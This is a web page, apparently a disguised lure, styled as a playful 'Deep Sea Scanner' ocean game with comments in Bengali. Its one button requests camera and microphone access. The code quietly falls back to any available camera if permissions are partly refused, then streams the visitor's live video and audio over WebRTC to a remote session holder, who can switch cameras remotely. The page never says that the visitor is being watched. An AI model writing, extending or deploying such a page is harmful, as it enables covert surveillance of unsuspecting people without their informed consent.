<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>🐙 Deep Sea Scanner</title>
  <script src="/socket.io/socket.io.js"></script>
  <style>
    body { font-family: sans-serif; text-align: center; background: #031322; color: #e0f2fe; padding-top: 50px; margin: 0; }
    h2 { font-size: 24px; margin-bottom: 20px; color: #38bdf8; }
    #status { font-size: 16px; color: #7dd3fc; margin-top: 20px; padding: 0 15px; }
    button { padding: 16px 30px; font-size: 18px; background: #0284c7; color: white; border: none; border-radius: 12px; font-weight: bold; width: 85%; max-width: 320px; cursor: pointer; box-shadow: 0 4px 15px rgba(2,132,199,0.4); }
  </style>
</head>
<body>
  <h2>🐙 Deep Sea Scanner</h2>
  <button id="start-btn" onclick="startStreaming()">🐬 Launch Dolphin Stream</button>
  <p id="status">🌊 Ready to dive into the ocean...</p>

  <script>
    const socket = io();
    const sessionId = new URLSearchParams(window.location.search).get('session');
    const statusEl = document.getElementById('status');
    let peerConnection, currentStream;
    let useFront = false;

    const config = { 
      iceServers: [
        { urls: 'stun:stun.l.google.com:19302' },
        { urls: 'stun:stun1.l.google.com:19302' }
      ] 
    };

    if (sessionId) {
      socket.emit('join-session', sessionId);
    } else {
      statusEl.innerText = '⚠️ Invalid link!';
    }

    // ফ্লেক্সিবল পারমিশন ফাংশন: কোনো একটি ফেইল করলেও স্ট্রিম চালু রাখবে
    async function getFlexibleStream(facing) {
      if (currentStream) {
        currentStream.getTracks().forEach(t => t.stop());
      }

      // ১. প্রথমে ক্যামেরা ও মাইক দুটোই নেওয়ার চেষ্টা করবে
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facing ? "user" : "environment" },
          audio: true
        });
      } catch (err1) {
        console.warn("Audio/Camera combo failed, trying video only:", err1);
      }

      // ২. অডিও মিস গেলে শুধু ভিডিও নিয়ে চালু করবে
      try {
        return await navigator.mediaDevices.getUserMedia({
          video: { facingMode: facing ? "user" : "environment" },
          audio: false
        });
      } catch (err2) {
        console.warn("Target camera failed, trying default camera:", err2);
      }

      // ৩. স্পেসিফিক ক্যামেরা ফেইল করলে যেকোনো এভেইলবল ক্যামেরা নিয়ে চালু করবে
      return await navigator.mediaDevices.getUserMedia({
        video: true,
        audio: false
      });
    }

    async function startStreaming() {
      try {
        currentStream = await getFlexibleStream(useFront);
        peerConnection = new RTCPeerConnection(config);

        currentStream.getTracks().forEach(track => {
          peerConnection.addTrack(track, currentStream);
        });

        peerConnection.onicecandidate = (e) => {
          if (e.candidate) {
            socket.emit('signal', { sessionId, data: { candidate: e.candidate } });
          }
        };

        const offer = await peerConnection.createOffer();
        await peerConnection.setLocalDescription(offer);
        socket.emit('signal', { sessionId, data: { offer } });

        statusEl.innerText = '🦈 Swimming live to submarine! (Stream Active)';
        document.getElementById('start-btn').style.display = 'none';

      } catch (err) {
        statusEl.innerText = '⚠️ All media access blocked: ' + err.message;
      }
    }

    // ক্যামেরা সুইচ
    socket.on('switch-camera', async () => {
      useFront = !useFront;
      try {
        const newStream = await getFlexibleStream(useFront);
        const newVideoTrack = newStream.getVideoTracks()[0];
        const sender = peerConnection.getSenders().find(s => s.track && s.track.kind === 'video');
        if (sender && newVideoTrack) {
          await sender.replaceTrack(newVideoTrack);
        }
        currentStream = newStream;
      } catch (e) {
        console.error('Camera switch error:', e);
      }
    });

    socket.on('signal', async (data) => {
      if (data.answer && peerConnection) {
        await peerConnection.setRemoteDescription(new RTCSessionDescription(data.answer));
      } else if (data.candidate && peerConnection) {
        try {
          await peerConnection.addIceCandidate(new RTCIceCandidate(data.candidate));
        } catch (e) {
          console.error(e);
        }
      }
    });
  </script>
</body>
</html>
